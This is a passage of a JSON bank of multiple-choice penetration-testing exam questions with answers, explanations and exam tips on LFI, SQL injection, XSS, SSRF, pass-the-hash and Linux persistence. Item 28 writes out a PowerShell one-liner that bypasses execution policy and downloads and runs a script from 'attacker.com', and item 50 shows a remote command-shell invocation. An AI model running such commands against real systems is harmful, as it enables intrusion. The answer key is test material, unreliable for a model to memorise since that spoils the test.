            "explanation": "Combining LFI with PHP's file inclusion features can lead to RCE. If you can include a file containing PHP code (either a local file you've somehow managed to upload, or a remote file if `allow_url_include` is enabled), that code will be executed by the server. The `php://filter` wrapper can be used to read and potentially encode/decode files, which can sometimes be leveraged for code execution. The `data://` wrapper allows you to include data directly in the URL as if it were a file.  XSS is a client-side vulnerability, DoS disrupts service, and brute-forcing passwords is unrelated to LFI/RCE.",
            "examTip": "LFI + PHP file inclusion (or wrappers) = Potential RCE."
        },
        {
             "id": 26,
             "question": "What is 'DLL injection'?",
             "options":[
                "A type of social engineering attack where an attacker impersonates a legitimate DLL file.",
                "A technique where an attacker forces a running process to load a malicious DLL (Dynamic Link Library), allowing the attacker's code to execute within the context and privileges of that process. This often involves exploiting vulnerabilities or using debugging APIs.",
                "A method for encrypting data stored in DLL files to protect it from unauthorized access.",
                "A technique for improving the performance of DLL files and the applications that use them."
             ],
             "correctAnswerIndex": 1,
             "explanation": "DLL injection is a code injection technique, *not* a social engineering attack. It involves forcing a *running process* to load and execute a malicious DLL. It's not about encryption or performance improvement.",
             "examTip": "DLL injection = Forcing a running process to load a malicious DLL."
        },
        {
            "id": 27,
            "question": "You have successfully compromised a Windows system and obtained a user's password hash.  Which of the following tools is specifically designed for *offline* password cracking, and is known for its ability to leverage GPU acceleration for faster cracking?",
            "options":[
               "Hydra",
               "Hashcat",
               "Nmap",
               "Burp Suite"
            ],
            "correctAnswerIndex": 1,
            "explanation": "Hashcat is a powerful, *offline* password cracking tool that supports various hash types (including NTLM, Kerberos, various cryptographic hashes) and can utilize GPUs for significantly accelerated cracking. Hydra is for *online* brute-force attacks. Nmap is a port scanner, and Burp Suite is a web application testing tool.",
            "examTip": "Hashcat = Offline password cracking (GPU acceleration)."
        },
         {
            "id": 28,
            "question": "Examine the following command, commonly used during post-exploitation on a compromised Windows system:\n```powershell\npowershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/evil.ps1')\"\n```\nWhat is the purpose of the `-ep bypass` argument in this command?",
            "options":[
               "It specifies the target IP address for the attack.",
               "It bypasses the PowerShell execution policy, allowing the downloaded script to run even if the system is configured to restrict script execution.",
               "It encrypts the downloaded script to prevent detection by antivirus software.",
               "It specifies the username and password for authentication."
            ],
            "correctAnswerIndex": 1,
            "explanation": "The `-ep bypass` argument (short for `-ExecutionPolicy Bypass`) in PowerShell temporarily overrides the system's execution policy, allowing unsigned or otherwise restricted scripts to run. This is a common technique used by attackers to execute malicious PowerShell scripts on compromised systems. The command downloads and executes a script from `http://attacker.com/evil.ps1`. It's not about specifying an IP address, encrypting the script, or providing credentials.",
            "examTip": "PowerShell `-ep bypass` = Bypass execution policy to run scripts."
        },
        {
            "id": 29,
            "question": "What is the primary difference between a 'bind shell' and a 'reverse shell'?",
            "options":[
               "A bind shell is used for attacking web applications, while a reverse shell is used for attacking network devices.",
                "A bind shell *listens* for incoming connections on the *target* machine; a reverse shell initiates a connection *from* the target machine *back* to the attacker's machine.",
                "A bind shell is more secure than a reverse shell because it uses encryption.",
                "There is no significant difference between a bind shell and a reverse shell."
            ],
            "correctAnswerIndex": 1,
            "explanation": "The key difference is the *direction* of the connection. A *bind shell* opens a listening port on the *target* machine, and the attacker connects *to* it. A *reverse shell* has the *target* machine connect *back* to the attacker's machine (which is listening for the connection). Reverse shells are often used to bypass firewalls that might block incoming connections to the target. They are used in various contexts, not just web apps or network devices. Security depends on the context, not the shell type itself.",
            "examTip": "Bind shell = Target listens for connection; Reverse shell = Target connects *back* to attacker."
        },
        {
            "id": 30,
            "question": "You are performing a penetration test and discover a web application that is vulnerable to XML External Entity (XXE) injection.  Which of the following BEST describes the potential impact of this vulnerability?",
            "options":[
               "An attacker can inject malicious scripts into web pages viewed by other users.",
               "An attacker can read arbitrary files from the web server's file system, potentially access internal network resources (through Server-Side Request Forgery), cause a denial-of-service, or, in some cases, achieve remote code execution.",
               "An attacker can force an authenticated user to execute unwanted actions on the web application.",
               "An attacker can gain direct access to the web application's database."
            ],
            "correctAnswerIndex": 1,
            "explanation": "XXE vulnerabilities exploit weaknesses in how applications parse XML input. By injecting malicious XML entities, an attacker can potentially read local files, access internal network resources (SSRF-like attacks), cause a denial-of-service (by consuming server resources), or even achieve remote code execution (depending on the XML parser and server configuration). Injecting scripts is XSS, forcing unintended actions is CSRF, and while database access *might* be an *indirect* consequence of XXE, it's not the defining characteristic.",
            "examTip": "XXE = Reading files, accessing internal resources, DoS, potential RCE (via file inclusion/parsing)."
        },
        {
            "id": 31,
             "question": "Which of the following is a common technique used for performing 'SQL injection' attacks?",
             "options":[
                "Sending phishing emails to a large number of recipients, hoping that some will click on malicious links.",
                "Injecting malicious SQL code into input fields (e.g., username, password, search boxes) of a web application (or any application that interacts with a database) that are not properly sanitized or validated, with the goal of manipulating database queries, bypassing authentication, accessing, modifying, or deleting data, or even executing commands on the database server.",
                "Scanning a network for open ports and services to identify potential entry points.",
                "Cracking passwords using a combination of brute-force and dictionary attacks."
             ],
             "correctAnswerIndex": 1,
             "explanation": "SQL injection specifically targets vulnerabilities in how applications handle user input when constructing database queries. The attacker injects SQL code to alter the query's logic and achieve unauthorized actions. Phishing is social engineering, port scanning is reconnaissance, and brute-force/dictionary attacks target passwords.",
             "examTip": "SQL injection = Injecting malicious SQL code into input fields to manipulate database queries."
        },
        {
           "id": 32,
           "question":"What is 'cross-site scripting' (XSS)?",
           "options":[
            "A type of denial-of-service attack that makes a web server unavailable to legitimate users by flooding it with traffic.",
            "An attack that involves injecting malicious client-side scripts (typically JavaScript) into web pages viewed by other users.  If the web application does not properly sanitize or encode user input before displaying it, the injected script will be executed by the victim's browser, potentially allowing the attacker to steal cookies, redirect users to malicious websites, deface the website, or perform other actions in the context of the victim's browser.",
            "A method for encrypting web traffic between a client and a server using SSL/TLS.",
            "A technique for cracking passwords using a brute-force or dictionary attack."
           ],
           "correctAnswerIndex": 1,
           "explanation":"Cross-Site Scripting (XSS) is a client-side code injection attack. The attacker injects malicious scripts into web pages, and these scripts are then executed by the browsers of other users who visit the affected pages. It's not a DoS attack, an encryption method, or a password cracking technique.",
           "examTip": "XSS = Injecting malicious client-side scripts (usually JavaScript) into web pages."
        },
        {
           "id": 33,
          "question": "You are analyzing network traffic captured with Wireshark and want to isolate all HTTP requests that contain the string 'admin' in the URL.  Which of the following Wireshark display filters is MOST appropriate?",
          "options":[
            "http.request.method == \"GET\"",
            "tcp.port == 80",
            "http.request.uri contains \"admin\"",
            "http && ip.addr == 192.168.1.100"
          ],
          "correctAnswerIndex": 2,
          "explanation": "The `http.request.uri` filter in Wireshark examines the entire URI (Uniform Resource Identifier) of HTTP requests, which includes the path and query string (the part of the URL after the domain name). The `contains` operator checks if the specified string ('admin' in this case) is present within the URI. Option A only filters for GET requests, which isn't specific enough. Option B only filters by port 80. Option D also has an ip filter which is not needed",
          "examTip": "Wireshark: `http.request.uri contains \"string\"` = Filter for specific text in HTTP request URLs."
        },
        {
            "id": 34,
            "question": "What is the primary purpose of using a 'Web Application Firewall' (WAF) in front of a web application?",
            "options":[
                "To encrypt all data stored on the web server's file system.",
                "To filter, monitor, and block malicious HTTP/HTTPS traffic to and from a web application, providing a layer of defense against common web attacks like SQL injection, cross-site scripting (XSS), cross-site request forgery (CSRF), and others. WAFs use a combination of techniques, including rule sets (signatures), anomaly detection, behavioral analysis, and sometimes machine learning, to identify and mitigate threats.",
                "To manage user accounts, permissions, and authentication for the web application.",
                "To improve the performance, speed, and scalability of the web application (though some WAFs may offer caching features)."
            ],
            "correctAnswerIndex": 1,
            "explanation": "A WAF is specifically designed to protect web applications by inspecting and filtering HTTP/HTTPS traffic. It acts as a reverse proxy, sitting between the client and the web server. It's not primarily for data encryption (though it might handle SSL/TLS termination), user management, or general performance improvement (though caching can be a feature).",
            "examTip": "WAF = Web application protection (filtering malicious HTTP/HTTPS traffic)."
        },
        {
           "id": 35,
           "question": "You are performing a penetration test against a web application and discover that it is possible to upload files with arbitrary extensions, including `.php`. You successfully upload a file named `shell.php` containing malicious PHP code and can then execute this code by accessing the file through a URL.  What type of vulnerability have you exploited, and what is the MOST severe potential consequence?",
           "options":[
            "Cross-Site Scripting (XSS); you can inject malicious scripts into web pages viewed by other users.",
            "Remote Code Execution (RCE); you can execute arbitrary commands on the web server, potentially gaining full control of the system.",
            "SQL Injection (SQLi); you can gain access to the web application's database and potentially steal or modify data.",
            "Denial-of-Service (DoS); you can make the web application unavailable to legitimate users."
           ],
           "correctAnswerIndex": 1,
           "explanation": "The ability to upload and execute server-side code (like PHP) is a critical vulnerability known as Remote Code Execution (RCE). This allows the attacker to run arbitrary commands on the server, potentially leading to complete system compromise. XSS involves injecting *client-side* scripts, SQLi targets databases, and DoS disrupts service availability.",
           "examTip": "Unrestricted file upload + server-side code execution (e.g., .php, .asp, .jsp) = RCE (very critical)."
        },
        {
            "id": 36,
             "question": "Which of the following techniques is MOST effective for mitigating the risk of 'man-in-the-middle' (MitM) attacks?",
             "options":[
                "Using strong, unique passwords for all user accounts.",
                "Using secure protocols like HTTPS (with properly configured and validated certificates), SSH, and VPNs; implementing network segmentation; using strong authentication mechanisms (e.g., 802.1X for wired and wireless networks); and employing security measures to prevent ARP poisoning and DNS spoofing.",
                "Enabling two-factor authentication (2FA) for all user accounts.",
                "Regularly updating the operating system and all installed software."
             ],
             "correctAnswerIndex": 1,
             "explanation": "MitM attacks rely on intercepting and potentially modifying network traffic. Secure protocols (HTTPS, SSH, VPNs) encrypt the traffic, making it difficult for attackers to eavesdrop or tamper with it. Network segmentation limits the impact of a MitM attack. Strong authentication (like 802.1X) helps ensure that only authorized devices connect to the network. Preventing ARP poisoning and DNS spoofing directly addresses common MitM techniques. Strong passwords and 2FA are good security practices, but they don't directly prevent MitM attacks. Updates are crucial for overall security.",
             "examTip": "Secure protocols (HTTPS, SSH, VPNs), network segmentation, strong authentication, preventing ARP/DNS spoofing = Mitigating MitM."
        },
        {
            "id": 37,
            "question":"What is 'pass-the-hash' (PtH)?",
            "options":[
                "A type of social engineering attack where an attacker tricks a user into revealing their password hash.",
                "An attack technique that allows an attacker to authenticate to a remote server or service by using the underlying NTLM (or, less commonly, LanMan) *hash* of a user's password, *without* needing to know the plaintext password itself. This bypasses the need to crack the hash.",
                "A method for encrypting data stored on a hard drive to protect it from unauthorized access.",
                "A technique for improving the performance of password hashing algorithms."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Pass-the-Hash exploits the way Windows authentication works. Instead of requiring the plaintext password, it allows authentication using the *hash* of the password. This means an attacker who obtains a user's NTLM hash (e.g., through credential dumping, LLMNR/NBT-NS poisoning) can authenticate as that user *without* needing to crack the hash. It's not a social engineering attack, encryption method, or performance improvement technique.",
            "examTip": "Pass-the-Hash = Authentication using NTLM hash, not plaintext password."
        },
        {
            "id": 38,
            "question": "You are performing a penetration test and discover a web application that is vulnerable to Local File Inclusion (LFI).  You can successfully read local files using techniques like `../../etc/passwd`. What additional technique, often combined with LFI, could potentially lead to Remote Code Execution (RCE) on a PHP-based web server?",
            "options":[
              "Injecting JavaScript code to perform Cross-Site Scripting (XSS).",
              "Leveraging PHP wrappers like `php://filter` or `data://` (if enabled), or attempting to include a file that contains PHP code (e.g., a log file with injected PHP code).",
              "Performing a denial-of-service (DoS) attack.",
              "Attempting to crack user passwords using a brute-force attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "While LFI allows reading local files, achieving RCE often requires combining it with other techniques. On PHP servers, the `php://filter` wrapper can be used to read and potentially encode/decode files, and in some cases, this can be manipulated to execute code. The `data://` wrapper allows including data directly in the URL as if it were a file. If the server allows remote file inclusion (`allow_url_include = On` in `php.ini`, which is highly discouraged), an attacker could include a remote file containing malicious PHP code. Another technique is to try and include a log file (e.g., Apache access log) where the attacker has previously injected PHP code (through a crafted HTTP request). XSS is a client-side vulnerability, DoS disrupts service, and brute-forcing passwords is unrelated to LFI/RCE.",
            "examTip": "LFI + PHP wrappers (`php://filter`, `data://`) or log file poisoning = Potential RCE."
        },
        {
            "id": 39,
            "question": "What is the primary difference between 'stored XSS' (persistent XSS) and 'reflected XSS'?",
            "options":[
              "Stored XSS is always more dangerous than reflected XSS.",
              "Stored XSS involves the malicious script being permanently stored on the target server (e.g., in a database, forum post, comment field), and it is served to *every* user who accesses the affected page. Reflected XSS involves the malicious script being reflected off the web server in a response to a *specific* request (e.g., clicking a malicious link, submitting a crafted form) and is executed only in the context of that single request.",
              "Reflected XSS is always more dangerous than stored XSS.",
              "There is no significant difference between stored XSS and reflected XSS."
            ],
            "correctAnswerIndex": 1,
            "explanation": "The key difference is where the malicious script resides and how it's delivered. Stored XSS is persistent (saved on the server) and affects multiple users. Reflected XSS is non-persistent; it requires the user to interact with a specifically crafted request. While stored XSS is *often* considered more dangerous due to its wider reach, both types can have severe consequences depending on the specific context. Saying one is *always* more dangerous is an oversimplification.",
            "examTip": "Stored XSS = Script saved on server, affects multiple users; Reflected XSS = Script in response to a *specific* request, not persistent."
        },
        {
            "id": 40,
            "question": "Analyze the following Linux command:\n```bash\nsudo tcpdump -i eth0 -w capture.pcap 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'\n```\nWhat type of network traffic is this command capturing, and why might a penetration tester use this specific filter?",
            "options":[
               "All TCP traffic on port 80.",
               "All HTTP traffic (port 80) and HTTPS traffic (port 443).",
               "Only TCP packets with a non-zero payload (data) on port 80. This is useful for filtering out empty TCP segments like SYN, ACK, FIN, etc., and focusing on packets that actually carry application data.",
               "Only TCP SYN packets on port 80."
            ],
            "correctAnswerIndex": 2,
            "explanation": "This `tcpdump` command is capturing *only* TCP packets on port 80 that contain *data*. Let's break down the complex filter: `-i eth0`: Captures traffic on the `eth0` interface. `-w capture.pcap`: Saves the captured traffic to a file named `capture.pcap`. `'tcp port 80 ...'`: Filters for TCP traffic on port 80. `(((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)`: This is the crucial part. It calculates the *TCP payload length* and checks if it's not zero.  * `ip[2:2]`: Total IP packet length (2 bytes). * `(ip[0]&0xf)<<2`: IP header length (lower 4 bits of the first byte, multiplied by 4 to get bytes). * `(tcp[12]&0xf0)>>2`: TCP header length (upper 4 bits of the 13th byte, divided by 4 â€“ same as multiplying by 0.25).  By subtracting the IP and TCP header lengths from the total IP packet length, we get the TCP payload length. If it's not zero, the packet contains data. This filter is useful for focusing on HTTP *requests and responses that contain data*, excluding empty connection setup/teardown packets.",
            "examTip": "Complex `tcpdump` filters can isolate specific types of packets based on headers and payload."
        },
        {
           "id": 41,
          "question": "Which of the following is a common method for an attacker to maintain persistence on a compromised Linux system?",
          "options":[
              "Using strong passwords for all user accounts.",
              "Modifying system startup scripts (e.g., in /etc/init.d/, systemd units, or rc.local), creating or modifying cron jobs, adding a user account with sudo privileges (if possible), creating a backdoor using tools like Netcat or SSH, or, in more advanced cases, installing a rootkit.",
              "Enabling a firewall to block unauthorized network connections.",
              "Regularly updating the operating system and all installed software."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Persistence mechanisms allow an attacker to regain access even after reboots, user logouts, or the discovery and patching of the initial vulnerability.  Modifying startup scripts, creating cron jobs, adding privileged users, creating backdoors, and installing rootkits are all common techniques. Strong passwords, firewalls, and updates are *defensive* measures.",
          "examTip": "Startup scripts, cron jobs, user accounts, backdoors, rootkits = Persistence on Linux."
        },
         {
            "id": 42,
            "question": "What is 'DLL preloading', and how does it differ from 'DLL hijacking'?",
            "options":[
                "DLL preloading and DLL hijacking are just different names for the same attack; there is no real difference.",
                "DLL preloading involves exploiting vulnerabilities in the application's *manifest* or *configuration* to specify a malicious DLL to be loaded *before* the legitimate DLL, even if the legitimate DLL is present in its expected location.  DLL hijacking, on the other hand, typically exploits the Windows DLL *search order* to load a malicious DLL *instead of* a missing or misplaced legitimate DLL.",
                "DLL preloading is a type of social engineering attack, while DLL hijacking is a type of network attack.",
                "DLL preloading is a technique used to improve application performance, while DLL hijacking is a method for encrypting data."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Both aim to load a malicious DLL, but they use different mechanisms. *DLL hijacking* often exploits the Windows DLL search order, placing a malicious DLL in a location that's searched *before* the legitimate DLL's location.  *DLL preloading* exploits the application's *configuration* (e.g., its manifest file or other configuration settings) to explicitly force the loading of a malicious DLL *before* any others, *regardless* of the search order.  Preloading can therefore be more reliable and harder to detect.  They are not social engineering or network attacks *per se*, nor are they related to performance improvement or encryption.",
            "examTip": "DLL hijacking = Exploits search order; DLL preloading = Exploits application configuration (manifest)."
        },
        {
          "id": 43,
          "question": "You are analyzing network traffic captured with Wireshark and you suspect that an attacker is attempting a 'slowloris' denial-of-service attack against a web server. Which of the following Wireshark filter and traffic patterns would BEST support this hypothesis?",
          "options":[
            "Filter: `http.request.method == \"POST\"`; Pattern: A large number of POST requests with very large payloads.",
            "Filter: `tcp.flags.syn == 1 && tcp.flags.ack == 0`; Pattern: A flood of SYN packets from many different source IP addresses.",
            "Filter: `tcp.port == 80 && http.request && http.connection == \"keep-alive\"`; Pattern: Many incomplete HTTP requests (missing final CRLF), with the 'Connection: keep-alive' header, originating from the same or a few IP addresses, and very slow data transmission rates.",
            "Filter: `http.request.method == \"GET\"`; Pattern: A large number of GET requests for a large file."
          ],
          "correctAnswerIndex": 2,
          "explanation": "Slowloris is a *low-bandwidth* DoS attack that targets web servers. It works by opening many connections to the target server and sending *incomplete* HTTP requests. It sends HTTP headers but *never completes* the request (by sending the final CRLF - Carriage Return and Line Feed - that signals the end of the headers). It also uses the `Connection: keep-alive` header to prevent the server from closing the connection.  The server keeps these connections open, waiting for the rest of the request, eventually exhausting its resources (connection pool).  Option A describes a potential HTTP POST flood, but not specifically Slowloris. Option B describes a SYN flood (a different type of DoS). Option D is also a possible DoS, but not the specific Slowloris pattern. The filter in Option C is a good starting point, but the *pattern* of *incomplete* requests and slow transmission is the key indicator of Slowloris.",
          "examTip": "Slowloris = Many *incomplete* HTTP requests with `Connection: keep-alive`, slow data rates."
        },
        {
            "id": 44,
            "question": "You are performing a penetration test and discover a web application that is vulnerable to Server-Side Request Forgery (SSRF). The application allows you to specify a URL as a parameter, and the server then fetches the content from that URL and displays it to you.  However, you *cannot* directly see the response from the server's requests; you can only infer information based on the application's behavior (e.g., timing differences, error messages). What type of SSRF is this, and which of the following techniques would be MOST useful for mapping internal network services?",
            "options":[
               "Blind SSRF; use port scanning techniques by providing URLs with different internal IP addresses and port numbers, and observing timing differences or error messages to infer whether a port is open or closed.",
               "Non-blind SSRF; use the `file://` protocol to read local files on the server.",
               "Blind SSRF; use the `dict://` protocol to access internal services.",
               "Non-blind SSRF; use the `gopher://` protocol to send arbitrary data to internal services."
            ],
            "correctAnswerIndex": 0,
            "explanation": "Since you can't directly see the server's responses, this is *Blind SSRF*.  To map internal services, you would use the SSRF vulnerability to make the server send requests to different internal IP addresses and ports.  By observing *differences in the application's behavior* (e.g., how long it takes to respond, whether it returns an error, the type of error), you can infer whether a port is open, closed, or filtered.  This is essentially a form of *blind port scanning* performed *through* the vulnerable server.  Non-blind SSRF would allow you to see the server's responses directly.  While `file://`, `dict://`, and `gopher://` can be useful in SSRF attacks, they are not the primary techniques for *blind* port scanning in this scenario. The core technique is to use the SSRF to make the *server* perform the scan, and infer the results from the *application's* behavior.",
            "examTip": "Blind SSRF + internal network mapping = Use the vulnerable server to port scan internal IPs/ports, inferring results from application behavior."
        },
        {
          "id": 45,
          "question": "Which of the following is the MOST accurate and comprehensive description of 'defense in depth' in information security?",
          "options":[
            "Relying solely on a single, robust firewall to protect a network from external threats.",
            "Implementing multiple, overlapping layers of security controls (physical, technical, and administrative) to protect assets, so that if one layer fails or is bypassed, other layers are in place to prevent or mitigate the attack. This includes using a combination of preventative, detective, and corrective controls.",
            "Using only intrusion detection systems (IDS) and intrusion prevention systems (IPS) to monitor network traffic and block malicious activity.",
            "Encrypting all data at rest and in transit to protect it from unauthorized access."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Defense in depth is about *layered security*. It involves using a *combination* of different security controls (physical, technical, administrative) and different control *types* (preventative, detective, corrective) to create a robust security posture. A single firewall is a single point of failure. Relying solely on IDS/IPS is reactive, not preventative. Encryption is an important *part* of defense in depth, but it's not the complete strategy.",
          "examTip": "Defense in depth = Multiple, overlapping layers of security controls (physical, technical, administrative; preventative, detective, corrective)."
        },
        {
            "id": 46,
            "question": "What is 'pass-the-ticket' (PtT) in the context of Windows and Kerberos authentication, and how does it differ from 'pass-the-hash' (PtH)?",
            "options":[
                "PtT and PtH are the same attack; both involve using stolen NTLM hashes to authenticate to Windows systems.",
                "PtT involves using a captured or forged Kerberos ticket to authenticate to a service *without* needing the user's password or password hash. PtH involves using a captured NTLM hash to authenticate, also without needing the plaintext password. They target different authentication mechanisms.",
                "PtT involves cracking a user's password using a rainbow table, while PtH involves cracking a user's password using a dictionary attack.",
                "PtT is a type of social engineering attack, while PtH is a type of network sniffing attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Both PtT and PtH allow authentication without knowing the plaintext password, but they target different authentication protocols. *Pass-the-Ticket* uses Kerberos tickets. *Pass-the-Hash* uses NTLM hashes. They are not the same attack. Neither involves *cracking* the password in the traditional sense (though cracking *might* be used to *obtain* the hash or ticket initially). They are not social engineering or sniffing attacks *per se* (though the hash or ticket might be *obtained* through sniffing).",
            "examTip": "Pass-the-Ticket = Kerberos; Pass-the-Hash = NTLM. Both bypass need for plaintext password."
        },
        {
            "id": 47,
           "question": "You are performing a penetration test and have discovered a web application that is vulnerable to SQL injection. You have determined that the database management system (DBMS) is MySQL. Which of the following SQL injection techniques is MOST likely to be effective for extracting the names of all tables in the database?",
           "options":[
             "Using the `@@version` variable to determine the database version.",
             "Querying the `information_schema.tables` table (e.g., using a UNION SELECT statement) to retrieve the table names.",
             "Using the `xp_cmdshell` stored procedure to execute operating system commands.",
             "Using the `SLEEP()` function to introduce time delays."
           ],
           "correctAnswerIndex": 1,
           "explanation": "In MySQL (and many other SQL databases), the `information_schema` database contains metadata about the database itself, including information about tables, columns, users, etc. The `information_schema.tables` table specifically contains information about all tables in all databases. By injecting a `UNION SELECT` statement that queries this table, you can retrieve the table names. `@@version` shows the database version. `xp_cmdshell` is a SQL Server stored procedure (not MySQL). `SLEEP()` is used for time-based blind SQLi, not for directly extracting table names.",
           "examTip": "MySQL: `information_schema.tables` = Table metadata (for SQLi)."
        },
         {
           "id": 48,
            "question": "What is a common technique used in 'credential stuffing' attacks?",
            "options":[
              "Sending phishing emails to a large number of recipients, hoping that some will click on malicious links.",
              "Using automated tools to test large numbers of stolen usernames and passwords (often obtained from data breaches) against various online services, exploiting the fact that many users reuse the same credentials across multiple sites.",
              "Exploiting a vulnerability in a web application to inject malicious SQL code.",
              "Scanning a network for open ports and services to identify potential entry points."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Credential stuffing leverages the widespread (and insecure) practice of password reuse. Attackers obtain lists of compromised credentials (username/password pairs) from data breaches and then use automated tools to try those credentials against *other* websites and services, hoping that users have reused the same credentials. It's not phishing (which is about *obtaining* credentials through deception), SQL injection (which targets databases), or port scanning (which is reconnaissance).",
            "examTip": "Credential stuffing = Using stolen credentials from one breach to attack other services (exploiting password reuse)."
        },
        {
          "id": 49,
          "question": "You are analyzing a compromised Linux system and suspect that an attacker may have established persistence. Which of the following locations and techniques should you investigate as potential persistence mechanisms?",
          "options":[
            "The `/tmp` directory only.",
            "System startup scripts (e.g., `/etc/init.d/`, systemd units, `/etc/rc.local`), cron jobs (`/etc/cron*` and user crontabs), SSH authorized_keys files, modified PAM (Pluggable Authentication Modules) configurations, and potentially installed rootkits.",
            "The `/home` directory only.",
            "The `/var/log` directory only."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Persistence on Linux can be achieved through various mechanisms.  Examining system startup scripts (to see if malicious code has been added to run on boot), cron jobs (for scheduled execution), SSH `authorized_keys` files (to allow SSH access without a password), and PAM configurations (to potentially bypass authentication) are all crucial. Rootkits are more advanced persistence mechanisms that can hide their presence. Checking *only* `/tmp`, `/home`, or `/var/log` is insufficient; a thorough investigation requires checking multiple locations.",
          "examTip": "Linux persistence: Check startup scripts, cron jobs, SSH keys, PAM, and look for rootkits."
        },
        {
           "id": 50,
            "question": "Examine the following command, and its purpose within a penetration testing context:\n```bash\nwinexe -U 'DOMAIN/user%password' //192.168.1.100 'cmd.exe'\n```\nWhat is this command attempting to do?",
            "options":[
               "Scan the target system (192.168.1.100) for open ports.",
               "Execute the command `cmd.exe` (i.e., open a command prompt) on the remote Windows system (192.168.1.100) using the credentials of the user 'user' in the domain 'DOMAIN', utilizing the `winexe` tool.",
               "Install a web server on the target system (192.168.1.100).",
               "Crack the password of the user 'user' in the domain 'DOMAIN'."
            ],
            "correctAnswerIndex": 1,
            "explanation": "`winexe` is a tool (similar in functionality to `psexec` from Sysinternals) that allows you to execute commands on a remote Windows system *from a Linux system*, using SMB/RPC.  This command is attempting to open a command prompt (`cmd.exe`) on the target Windows machine (192.168.1.100) using the provided credentials. It's *not* a port scan, web server installation, or password cracking. The `-U` option specifies the username in the format `DOMAIN/user%password`.",
            "examTip": "`winexe` = Execute commands on remote Windows systems from Linux (like `psexec`)."
        },
        {
             "id": 51,
              "question": "What is 'DLL preloading' and how can it be used for malicious purposes?",
              "options":[
                "DLL preloading is a type of social engineering attack.",
                "DLL preloading is a technique where an attacker exploits vulnerabilities in an application's *manifest* or *configuration* to force it to load a malicious DLL *before* the legitimate DLL, even if the legitimate DLL is present in its expected location. This allows the attacker's code to execute with the privileges of the vulnerable application.",
                "DLL preloading is a method for encrypting DLL files.",
                "DLL preloading is a technique used to improve application performance"
              ],
              "correctAnswerIndex": 1,
              "explanation": "DLL preloading, unlike DLL hijacking (which often exploits the DLL search order), leverages the application's *configuration* (e.g., manifest files) to *force* the loading of a specific DLL. If an attacker can modify this configuration or place a malicious DLL in a location specified by the configuration, they can achieve code execution. It's not a social engineering attack, an encryption method, or a performance technique.",
              "examTip": "DLL preloading = Exploiting application configuration (manifest) to force loading of malicious DLL."
        },
        {
          "id": 52,
          "question": "Which of the following is a common technique for bypassing web application firewalls (WAFs)?",
          "options":[
            "Using strong passwords for all user accounts.",
            "Using techniques like character encoding (e.g., URL encoding, HTML encoding, Unicode variations), obfuscation (e.g., using different SQL keywords, inserting comments, manipulating case), HTTP parameter pollution, request smuggling, and exploiting vulnerabilities in the WAF itself.",
            "Enabling HTTPS for all web traffic.",
            "Regularly updating the web application's software and dependencies."
          ],
          "correctAnswerIndex": 1,
          "explanation": "WAFs often rely on pattern matching and rules to identify and block malicious requests. Attackers can try to bypass these rules by encoding or obfuscating their payloads, making them look different from known attack signatures. HTTP parameter pollution (sending multiple parameters with the same name) and request smuggling (exploiting differences in how front-end and back-end servers handle HTTP requests) can also sometimes bypass WAFs. Exploiting WAF vulnerabilities is a more advanced technique. Strong passwords, HTTPS, and updates are important security practices, but they don't directly address WAF evasion.",
          "examTip": "Encoding, obfuscation, parameter pollution, request smuggling, WAF exploits = WAF evasion techniques."
        },
        {
            "id": 53,
            "question": "You are analyzing a system that you suspect is compromised. You run the `netstat -ano` command on a Windows machine and see the following output (among other lines):\n```\n  TCP    0.0.0.0:135           0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:445           0.0.0.0:0              LISTENING       4\n  TCP    [::]:135              [::]:0                 LISTENING       4\n  TCP    [::]:445              [::]:0                 LISTENING       4\n  TCP    192.168.1.100:49678   104.26.10.105:443      ESTABLISHED     1234\n```\nWhich line in this output is MOST suspicious and warrants further investigation in the context of a potential compromise?",
            "options":[
                "TCP    0.0.0.0:135           0.0.0.0:0              LISTENING       4",
                "TCP    0.0.0.0:445           0.0.0.0:0              LISTENING       4",
                "TCP    [::]:135              [::]:0                 LISTENING       4",
                "TCP    [::]:445              [::]:0                 LISTENING       4",
                "TCP    192.168.1.100:49678   104.26.10.105:443      ESTABLISHED     1234"
            ],
            "correctAnswerIndex": 4,
            "explanation": "While ports 135 (RPC) and 445 (SMB) are commonly used and *can* be legitimate listening ports on a Windows system (often associated with core system services, PID 4 is often the System process), an *established* connection to an *external* IP address on a high, dynamic port (49678 in this case) is *more* suspicious, especially if the destination IP address (104.26.10.105) is unknown or unexpected. This could indicate a reverse shell, outbound C2 (command and control) traffic, or data exfiltration. You would need to investigate process ID 1234 to determine what program is responsible for this connection. The other lines, *by themselves*, are less suspicious; they show typical listening ports for Windows services.",
            "examTip": "Unexpected *outbound* connections from a compromised system (especially to high, dynamic ports) are highly suspicious."
        },
         {
             "id": 54,
             "question": "What is 'input validation', and why is it crucial for web application security?",
             "options":[
                "Input validation is a technique used to encrypt user passwords before storing them in a database.",
                "Input validation is the process of checking and sanitizing user-supplied data to ensure that it conforms to expected formats, lengths, types, and values, and that it does not contain malicious code or characters. It is a fundamental defense against a wide range of web application vulnerabilities, including injection attacks (like SQL injection and cross-site scripting), buffer overflows, and other attacks that exploit malformed or unexpected input.",
                "Input validation is a method for improving the performance of web applications by reducing the amount of data that needs to be processed.",
                "Input validation is a technique used to manage user sessions and prevent session hijacking attacks."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Input validation is a *critical* security control that prevents attackers from injecting malicious code or manipulating the application's behavior through user-supplied data. It's about ensuring that *all* input is safe *before* it's used by the application. It's not primarily about password encryption (which is a separate, but also important, security measure), performance improvement, or session management.",
             "examTip": "Input validation = Checking *all* user input for safety and preventing injection attacks."
        },
        {
          "id": 55,
            "question": "You are performing a penetration test and have gained access to a Linux system. You want to determine if any network interfaces are operating in promiscuous mode. Which command is BEST suited for this task?",
            "options":[
              " `ps aux`",
              " `ifconfig -a` (or `ip link show`)",
              " `netstat -tulnp`",
